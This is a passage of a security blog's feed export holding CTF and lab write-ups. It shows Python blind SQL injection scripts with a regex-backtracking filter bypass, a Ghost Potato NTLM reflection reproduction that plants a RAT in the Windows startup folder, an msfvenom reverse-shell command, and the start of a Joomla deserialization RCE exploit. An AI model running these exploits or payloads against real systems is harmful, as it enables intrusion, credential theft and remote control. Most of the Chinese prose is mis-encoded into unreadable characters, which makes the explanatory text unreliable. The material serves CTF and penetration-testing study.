class="line">        payload = &#123;</span><br><span class="line">            <span class="string">"id"</span>:<span class="string">"(ascii(substr(database(),&#123;&#125;,10))=&#123;&#125;)+1"</span>.format(i, j)</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, payload)</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'guest'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            database_name += chr(j)</span><br><span class="line">            print(database_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># owl_donkey</span></span><br></pre></td></tr></table></figure></p><p><img src="/TetCTF - Secure System Write-up.resources/31624890-45DB-4217-9315-E602A17EC5B8.png" alt="85c5dd1254be513f98f349eb7cd47fb8"></p><p>æ³¨è¡¨åçš„æ—¶å€™åˆé‡åˆ°äº†é—®é¢˜ï¼Œinformation_schemaå’Œmysql.innodb_table_statséƒ½éœ€è¦ä½¿ç”¨<code>in</code>ï¼Œè¿™é‡Œéœ€è¦æ‹¿<br><code>sys.x$schema_flattened_keys</code>ç»•è¿‡</p><p>å…³äº<code>sys.x$schema_flattened_keys</code>,å¯ä»¥çœ‹å®ƒçš„ç»„æˆè¯­å¥<br><a href="https://github.com/mysql/mysql-sys/blob/master/views/i_s/x_schema_flattened_keys.sql" target="_blank" rel="noopener">https://github.com/mysql/mysql-sys/blob/master/views/i_s/x_schema_flattened_keys.sql</a></p><p>åŒæ ·çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>sys.x$schema_table_statistics</code>ï¼Œè¿™ä¸ªæ›´å¥½ï¼Œå› ä¸ºsys.x$schema_flattened_keysæ˜¯åŸºäºindexçš„ï¼Œè¿™ä¸ªçš„è¯ï¼Œä¼šæŠŠ<code>sys.x$schema_flattened_keys</code>è¡¨ä¸­æ²¡æœ‰çš„ä¹Ÿåˆ—å‡ºæ¥</p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html</a></p><p><img src="/TetCTF - Secure System Write-up.resources/56B35F7D-EA38-4663-ACA0-1FC4244D2908.png" alt="2b07bdb34413f05f7ca6eb4b030e607d"></p><p><img src="/TetCTF - Secure System Write-up.resources/79AD0B24-8E8C-41A6-B72D-0944D8045E6C.png" alt="8fb416e975b51f8df333dd0484f56f1c"></p><p><img src="/TetCTF - Secure System Write-up.resources/007A7C9A-7EFE-488D-B41A-017133728593.png" alt="6e9e8286efbf5b718063109b83239aac"></p><p><img src="/TetCTF - Secure System Write-up.resources/6B884E33-3C68-4377-B756-B151E6162017.png" alt="9242e3a76332820539e37d6cb5ae2834"></p><p><img src="/TetCTF - Secure System Write-up.resources/007A7C9A-7EFE-488D-B41A-017133728593.png" alt="6e9e8286efbf5b718063109b83239aac"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 12:23</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_tbs.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">proxy = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8000"</span>&#125;</span><br><span class="line"></span><br><span class="line">chars = <span class="string">'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&amp;*()_+&#123;&#125;-='</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> chars:</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">'id'</span>: <span class="string">'2 &amp;&amp; ascii(substr((select table_name from sys.x$schema_table_statistics where table_schema=database() limit 1,1),&#123;&#125;,25))=ascii("&#123;&#125;")'</span>.format(i, j)&#125;</span><br><span class="line">        res = requests.post(url, headers=&#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>&#125;, data=payload, proxies = proxy)</span><br><span class="line">        <span class="comment"># res = requests.post(url, payload)</span></span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'guest'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            table_name += chr(j)</span><br><span class="line">            print(table_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Th1z_Fack1n_Fl4444g_Tabl3</span></span><br></pre></td></tr></table></figure><p>æœ€åéœ€è¦ç”¨åˆ°ä¸ç”¨åˆ—åçš„æ³¨å…¥<br><img src="/TetCTF - Secure System Write-up.resources/8432F298-8697-47E9-BE14-878DFC881031.png" alt="a76496e56389cb4c52c6398954e74c6c"></p><p>ä½†æ˜¯è¿‡æ»¤äº†unionâ€¦select<br>å¯ä»¥é€šè¿‡åˆ©ç”¨pcreçš„æ­£åˆ™å›æœ”é™åˆ¶-&gt; <a href="https://www.php.net/manual/en/pcre.configuration.php" target="_blank" rel="noopener">https://www.php.net/manual/en/pcre.configuration.php</a></p><p><img src="/TetCTF - Secure System Write-up.resources/F66E9D29-E130-42A6-A1B6-8EF052EDA480.png" alt="a680d61975012035e830da60c6570f88"></p><p><img src="/TetCTF - Secure System Write-up.resources/64083455-674F-45B7-95F1-75E9802FCD3B.png" alt="07bdea7497a2c62c8d713e3694d4d219"></p><p><img src="/TetCTF - Secure System Write-up.resources/F4E3B33D-6A21-4F47-8074-D4A04B97F4F3.png" alt="0e569c73134f02f2a88532cee36b032f"><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2020-01-09 14:16</span></span><br><span class="line"><span class="comment"># @Author  : Patrilic</span></span><br><span class="line"><span class="comment"># @FileName: sql_flag.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://45.77.240.178:8002/index.php"</span></span><br><span class="line">payload = <span class="string">'union/*'</span>+<span class="string">'a'</span>*<span class="number">1000000</span>+<span class="string">'*/select 1,(select b from (select 1 as a, 2 as b union/*'</span>+<span class="string">'a'</span>*<span class="number">1000000</span>+<span class="string">'*/select * from Th1z_Fack1n_Fl4444g_Tabl3)c limit 1,1),3-- -'</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url,headers=&#123;<span class="string">'Content-Type'</span>:<span class="string">'application/x-www-form-urlencoded'</span>&#125;,data=&#123;<span class="string">'id'</span>:<span class="string">'-2 &#123;&#125;'</span>.format(payload)&#125;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p><p><img src="/TetCTF - Secure System Write-up.resources/6462EED4-7128-4E75-9148-7E067338D346.png" alt="299159676ac7baa72c532e811c662aa5"></p><h2 id="0x02-å…¶ä»–è§£æ³•"><a href="#0x02-å…¶ä»–è§£æ³•" class="headerlink" title="0x02 å…¶ä»–è§£æ³•"></a>0x02 å…¶ä»–è§£æ³•</h2><p>å¦‚æœä¸ç”¨ç®¡æ­£åˆ™å›æœ”çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªpayload<br><img src="https://miro.medium.com/max/2946/1*MWzWtiWrwUBXJ_IPgG5dZw.png" alt="c0f735cf4c0143d7a7f22e9e3a41c996.png"><br>é“¾æ¥: <a href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952" target="_blank" rel="noopener">https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952</a></p><p><img src="/TetCTF - Secure System Write-up.resources/D9FB03F7-73AB-4245-B66A-E84AF090B105.png" alt="d8102c59d29372db6ba37a26ff4d1ed9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-01-09 14:49:00&lt;br&gt;&lt;img src=&quot;/wallpaper/vocaloid.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-é¢˜ç›®
      
    
    </summary>
    
      <category term="Write-up" scheme="http://patrilic.top/categories/Write-up/"/>
    
    
      <category term="SQLi" scheme="http://patrilic.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Ghost Potato å¤ç°</title>
    <link href="http://patrilic.top/2020/01/08/Ghost%20Potato%20%E5%A4%8D%E7%8E%B0/"/>
    <id>http://patrilic.top/2020/01/08/Ghost Potato å¤ç°/</id>
    <published>2020-01-08T06:11:00.000Z</published>
    <updated>2020-01-15T07:25:23.054Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2020-01-08 14:11:00<br><img src="/wallpaper/8898355.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>11æœˆä»½çš„æ—¶å€™shenaniganslabså‘äº†åšæ–‡ï¼Œè®²äº†å…³äºCVE-2019-1384çš„æ¼æ´è¯¦æƒ…<br><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html</a></p><p>è¿™åŒæ ·æ˜¯ä¸€ä¸ªPotatoç³»åˆ—çš„æ¼æ´ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç»•è¿‡äº†MS08-068çš„ä¿®è¡¥æ–¹æ¡ˆï¼Œå®ç°æœ¬æœºçš„NTLMåå°„ï¼Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p><h2 id="0x01-NTLM-è®¤è¯è¿‡ç¨‹"><a href="#0x01-NTLM-è®¤è¯è¿‡ç¨‹" class="headerlink" title="0x01 NTLM è®¤è¯è¿‡ç¨‹"></a>0x01 NTLM è®¤è¯è¿‡ç¨‹</h2><p>è¦ææ¸…æ¥šNTLMåå°„ï¼Œé¦–å…ˆæ¥å›é¡¾ä¸€ä¸‹NTLMçš„è®¤è¯è¿‡ç¨‹ã€‚</p><p>NTLMè®¤è¯åŸºäºC/SéªŒè¯æœºåˆ¶ï¼Œç”±ä¸‰ç§æ¶ˆæ¯ç»„æˆ: åå•†ï¼Œè´¨è¯¢ï¼ŒéªŒè¯</p><p>type1ï¼šåå•† </p><p>ä¸»è¦æ˜¯å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å®¢æˆ·ç«¯æ”¯æŒå’ŒæœåŠ¡å™¨è¯·æ±‚çš„åŠŸèƒ½åˆ—è¡¨<br><img src="/Ghost Potato å¤ç°.resources/F907D21A-6198-4A06-BE96-D67FE0F0D94D.png" alt="8a9adf48b220765148159420352b0926"></p><p><img src="/Ghost Potato å¤ç°.resources/CFA2D1D3-F936-415C-8CDF-D2B96E4387C4.png" alt="5fe17581a5f18b94e056372f40a143b3"></p><p>type2: è´¨è¯¢</p><p>æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æœåŠ¡å™¨æ”¯æŒçš„åŠŸèƒ½åˆ—è¡¨ï¼Œå¹¶ä¸”åŒæ—¶å‘é€ä¸€ä¸ª16ä½çš„Challengeï¼Œ å¹¶ä¸”åŒæ—¶å‘é€æœåŠ¡å™¨çš„å„ç±»ä¿¡æ¯äº<code>Target Info</code>å­—æ®µ<br><img src="/Ghost Potato å¤ç°.resources/FDDC5458-4604-4EDD-9229-C41409298B7A.png" alt="17a05d76aea975ebc761066fb353203a"><br><img src="/Ghost Potato å¤ç°.resources/10DB989A-A63E-407A-8E68-65D16E8F9F1E.png" alt="1fc4e34dc48fe639178e8635e331b489"></p><p>type3: éªŒè¯</p><p>å®¢æˆ·ç«¯æ”¶åˆ°Challengeåï¼Œä½¿ç”¨è‡ªèº«çš„NTLM HashåŠ å¯†Challengeå¾—åˆ°Responseï¼Œå°†Responseå‘é€ç»™æœåŠ¡ç«¯.ç„¶åæœåŠ¡ç«¯åœ¨æœ¬åœ°è°ƒç”¨ç”¨æˆ·NTLM hashåŠ å¯†Challengeåï¼Œä¸Responseè¿›è¡Œå¯¹æ¯”ã€‚<br><img src="/Ghost Potato å¤ç°.resources/524712DF-E16A-47B1-8C8C-84AF4B784EB2.png" alt="325b4135ce785efc07a203672063569d"><br><img src="/Ghost Potato å¤ç°.resources/F0CDF5B0-E83B-430A-ADC9-87D6E2D07DBD.png" alt="65e13805817ab41463a35466c17db3cd"></p><h2 id="0x02-ms08-068"><a href="#0x02-ms08-068" class="headerlink" title="0x02 ms08-068"></a>0x02 ms08-068</h2><p><img src="/Ghost Potato å¤ç°.resources/045D32EE-D9C4-4643-B428-E94448F1F328.png" alt="1b4ac4b788cb76a6e198f0892b450ff5"></p><p>è¿™é‡Œéœ€è¦çœ‹ä¸€ä¸ªå‡½æ•°<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-initializesecuritycontexta" target="_blank" rel="noopener">InitializeSecurityContextA</a></p><p>è¿™ä¸ªå‡½æ•°å±äº<code>sspi.h</code>, å…³äºSSPçš„ä½œç”¨å°±ä¸å†èµ˜è¿°äº†</p><p>å‡½æ•°ä¸»ä½“ï¼š<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SECURITY_STATUS SEC_ENTRY <span class="title">InitializeSecurityContextA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  PCredHandle    phCredential,</span></span></span><br><span class="line"><span class="function"><span class="params">  PCtxtHandle    phContext,</span></span></span><br><span class="line"><span class="function"><span class="params">  SEC_CHAR       *pszTargetName,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  fContextReq,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Reserved1,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  TargetDataRep,</span></span></span><br><span class="line"><span class="function"><span class="params">  PSecBufferDesc pInput,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  Reserved2,</span></span></span><br><span class="line"><span class="function"><span class="params">  PCtxtHandle    phNewContext,</span></span></span><br><span class="line"><span class="function"><span class="params">  PSecBufferDesc pOutput,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> <span class="keyword">long</span>  *pfContextAttr,</span></span></span><br><span class="line"><span class="function"><span class="params">  PTimeStamp     ptsExpiry</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªpszTargetNameå‚æ•°ï¼Œ ms08-068çš„ä¿®å¤æ–¹æ¡ˆä¹Ÿå°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‚æ•°è¿›è¡Œçš„<br><img src="/Ghost Potato å¤ç°.resources/115F192E-A60E-4479-8895-32F04A94AB78.png" alt="29288cfa28f66aba44e0ab9f73a517f1"></p><p>å½“æˆ‘ä»¬å­˜åœ¨ä¸¤ä¸ªä¸»æœºè¿›è¡ŒSMBé€šä¿¡æ—¶ï¼ŒAå‘Bå‘é€äº†type1è¯·æ±‚ï¼ŒåŒæ—¶ä»–å°†è‡ªå·±çš„pszTargetNameè®¾ç½®ä¸º<code>cifs/B</code>, å½“æ‹¿åˆ°type2çš„challengeæ—¶ï¼Œå‘lsassè¿›ç¨‹ä¸­å†™å…¥ç¼“å­˜ -&gt; (Challenge,<code>cifs/B</code>)ã€‚ è€ŒåAå‘Bå‘é€type3ï¼ŒBæ”¶åˆ°responseåï¼Œä¼šåˆ°lsassä¸­å»å¯»æ‰¾æ˜¯å¦å­˜åœ¨ç¼“å­˜(Challenge,<code>cifs/B</code>), å› ä¸ºåªæœ‰Aä¸»æœºå†™å…¥äº†ç¼“å­˜ï¼Œæ‰€ä»¥å¦‚æœAå’ŒBä¸æ˜¯åŒä¸€ä¸ªä¸»æœºï¼Œé‚£ä¹ˆè‚¯å®šBä¸»æœºä¸å­˜åœ¨ç¼“å­˜ï¼Œè®¤è¯æˆåŠŸã€‚</p><h2 id="0x03-cve-2019-1384"><a href="#0x03-cve-2019-1384" class="headerlink" title="0x03 cve-2019-1384"></a>0x03 cve-2019-1384</h2><p>è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ç»•è¿‡äº†ç¼“å­˜çš„é™åˆ¶ï¼Œå› ä¸ºlsassä¸­çš„ç¼“å­˜(Challenge,<code>cifs/B</code>),åœ¨300såä¼šè‡ªåŠ¨æ¶ˆå¤±</p><p>åˆ©ç”¨æµç¨‹ï¼š<br><img src="/Ghost Potato å¤ç°.resources/3EB9D266-B198-4E2D-B772-8B40453DCB8A.png" alt="6f8b3a6d4a3d8162d7f0038da8ea9c8d"></p><p><img src="/Ghost Potato å¤ç°.resources/340E6D7C-E3A5-422A-ADDB-CE4A88B1B4FB.png" alt="a4cc7175c7336fa2ce112be224e599ba"></p><p>ç»è¿‡315såï¼Œå†å‘é€type3, é‚£ä¹ˆåˆ°æ—¶å€™lsassä¸­çš„ç¼“å­˜å·²ç»æ¶ˆé™¤ï¼Œå¯ä»¥æˆåŠŸè®¤è¯æœ¬æœºå™¨</p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04 æ¼æ´å¤ç°"></a>0x04 æ¼æ´å¤ç°</h2><p>ä½œè€…åŸæ–‡ä¸­æä¾›çš„Poc: <a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip" target="_blank" rel="noopener">impacket-ghostpotato</a></p><p>ç”±äºä»–ç»™çš„Pocåªæ”¯æŒHTTPåè®®ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨IEæµè§ˆå™¨è¿›è¡Œè®¿é—®å³å¯<br>é…åˆresponderçš„LLMNRæŠ•æ¯’<br><code>responder -I eth0 --lm</code><br><img src="/Ghost Potato å¤ç°.resources/8B3E0429-8C31-4B51-A041-B53AA33DFED2.png" alt="e7d97909c09c6df2e635a79f42d008fa"></p><p><img src="/Ghost Potato å¤ç°.resources/931621A9-E083-432B-995A-E8456273F419.png" alt="4b70a636a099df1df6edaa589a7b502a"></p><p><img src="/Ghost Potato å¤ç°.resources/BC25ADA7-5E50-4761-90F1-2CBFAAA8A1D8.png" alt="4293fc2ae9929ce256a093d83abd5268"></p><p>ä¸Šä¼ ratæ–‡ä»¶åˆ°WIndowså¯åŠ¨ç›®å½•ï¼Œç”¨æˆ·ä¸‹æ¬¡ç™»å½•æ—¶è‡ªå¯åŠ¨<br><img src="/Ghost Potato å¤ç°.resources/57058489-892B-40D3-AB6D-C19EDC7412FB.png" alt="38bfbc3c2bfbf0f45b824b6925c00bcc"></p><p><img src="/Ghost Potato å¤ç°.resources/14664359-3329-4C68-A03A-8AD724A586A5.png" alt="c7d00b80d814559146c3e304fad08fcd"><br><img src="/Ghost Potato å¤ç°.resources/BFA561E6-5967-4E97-A1B8-561A3FFC5BC4.png" alt="0f90f41771ce981e210e0e55f5a0df6e"></p><p>Pocæä¾›ä¸¤ä¸ªä¸Šä¼ è·¯å¾„<br><img src="/Ghost Potato å¤ç°.resources/C5DF6644-AD4F-47E3-AD26-55318D0F2C63.png" alt="4274fad42facd59cf6937337a452c9d9"></p><h2 id="0x05-å¼•ç”¨é“¾æ¥ğŸ”—"><a href="#0x05-å¼•ç”¨é“¾æ¥ğŸ”—" class="headerlink" title="0x05 å¼•ç”¨é“¾æ¥ğŸ”—"></a>0x05 å¼•ç”¨é“¾æ¥ğŸ”—</h2><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4" target="_blank" rel="noopener">https://daiker.gitbook.io/windows-protocol/ntlm-pian/4</a><br><a href="https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html" target="_blank" rel="noopener">https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html</a><br><a href="https://support.microsoft.com/kb/957097/" target="_blank" rel="noopener">https://support.microsoft.com/kb/957097/</a><br><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2020-01-08 14:11:00&lt;br&gt;&lt;img src=&quot;/wallpaper/8898355.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;
      
    
    </summary>
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://patrilic.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="Potato" scheme="http://patrilic.top/tags/Potato/"/>
    
  </entry>
  
  <entry>
    <title>iSoonLab.org Write-up</title>
    <link href="http://patrilic.top/2019/12/12/iSoonLab.org%20Write-up/"/>
    <id>http://patrilic.top/2019/12/12/iSoonLab.org Write-up/</id>
    <published>2019-12-12T06:32:22.000Z</published>
    <updated>2019-12-12T07:26:41.417Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-12-12 14:32:22<br><img src="/wallpaper/[30125]16347313.jpg" alt></p></blockquote><h2 id="é¢˜ç›®æ‹“æ‰‘"><a href="#é¢˜ç›®æ‹“æ‰‘" class="headerlink" title="é¢˜ç›®æ‹“æ‰‘"></a>é¢˜ç›®æ‹“æ‰‘</h2><p>Linux1 - solr: 192.168.21.12</p><p>Linux2 - joomla!: 192.168.21.20</p><p>Backup.sub.iSoonLab.org: 192.168.21.8</p><p>subdc.sub.iSoonLab.org: 192.168.21.4  /  10.153.69.50</p><p>DC.iSoonLab.org: 10.153.69.5</p><p><img src="/iSoonLab.org Write-up/image-20191201130447779.png" alt="image-20191201130447779"></p><h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>ç›®æ ‡:192.168.121.131</p><p><img src="/iSoonLab.org Write-up/image-20191130235112082.png" alt="image-20191130235112082"></p><p>å¼€æ”¾8983ç«¯å£ï¼Œæ‰“å¼€æ˜¯solræœªæˆæƒï¼Œ8.1.1ç‰ˆæœ¬ï¼Œè”æƒ³åˆ°å‰æ®µæ—¶é—´å¾ˆç«çš„Apache Solr RCE</p><p><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a>    </p><p>æ ¹æ®ç½‘ä¸Šçš„exp</p><p><a href="http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false" target="_blank" rel="noopener">http://192.168.121.131:8983/solr/admin/cores?wt=json&amp;indexInfo=false</a></p><p><img src="/iSoonLab.org Write-up/image-20191130235337378.png" alt="image-20191130235337378"></p><p>å­˜åœ¨iSoon core</p><p><img src="/iSoonLab.org Write-up/image-20191130235734297.png" alt="image-20191130235734297"></p><p><img src="/iSoonLab.org Write-up/image-20191130235823000.png" alt="image-20191130235823000"></p><p>ç¡®å®æ²¡é—®é¢˜ï¼Œå¼¹ä¸ªshellåˆ°æœ¬æœºæ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IP_Addr&gt; LPORT=&lt;Port_Num&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>å› ä¸ºsolrç”¨æˆ·æ²¡æœ‰/tmpç›®å½•å†™æƒé™ï¼Œ å¯ä»¥å‚è€ƒ@hayaå¤§æ‰‹å­çš„<a href="https://forum.90sec.com/t/topic/579" target="_blank" rel="noopener">https://forum.90sec.com/t/topic/579</a></p><p>ç”¨perlæ¥æ‰§è¡Œè„šæœ¬</p><p><img src="/iSoonLab.org Write-up/image-20191201002127259.png" alt="image-20191201002127259"></p><p>flagå°±åœ¨å½“å‰ç›®å½•</p><p><img src="/iSoonLab.org Write-up/image-20191201002513741.png" alt="image-20191201002513741"></p><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥åœ¨/var/tmpé‡Œå†™æ–‡ä»¶ï½</p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>ç®€å•ä¾¦æŸ¥åï¼Œå‘ç°å­˜åœ¨192.168.21.0/24ç½‘æ®µ</p><p><img src="/iSoonLab.org Write-up/image-20191201002640156.png" alt="image-20191201002640156"></p><p>ä½¿ç”¨msfè‡ªå¸¦çš„sock4aä½œä»£ç†å³å¯ï¼ŒLinux1åªæ˜¯ç”¨æ¥æ’•æ¥æµé‡å£å­</p><p>ä»£ç†å†…ç½‘åï¼Œå‘ç°åŒç½‘æ®µå­˜åœ¨ä¸‰å°æœºå™¨</p><p>æ‰¾åˆ°Linux2 : 192.168.21.20ï¼Œ å¼€æ”¾HTTPç«¯å£</p><p><img src="/iSoonLab.org Write-up/image-20191201003644193.png" alt="image-20191201003644193"></p><p>joomla-3.4.6ç‰ˆæœ¬ï¼Œå­˜åœ¨RCEï¼Œé€šè¿‡æ„é€ expï¼Œæ‹¿åˆ°webshell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JSimplepieFactory</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysql</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JDatabaseDriverMysqli</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $xx;</span><br><span class="line">    <span class="keyword">protected</span> $connection;</span><br><span class="line">    <span class="keyword">protected</span> $disconnectHandlers;</span><br><span class="line">    <span class="keyword">protected</span> $obj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;xx = <span class="keyword">new</span> JSimplepieFactory();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connection = <span class="number">1</span>;</span><br><span class="line">        $obj = <span class="keyword">new</span> SimplePie;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;disconnectHandlers = [</span><br><span class="line">            [$obj, <span class="string">"init"</span>],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimplePie</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $sanitize;</span><br><span class="line">    <span class="keyword">var</span> $cache_name_function;</span><br><span class="line">    <span class="keyword">var</span> $feed_url;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span 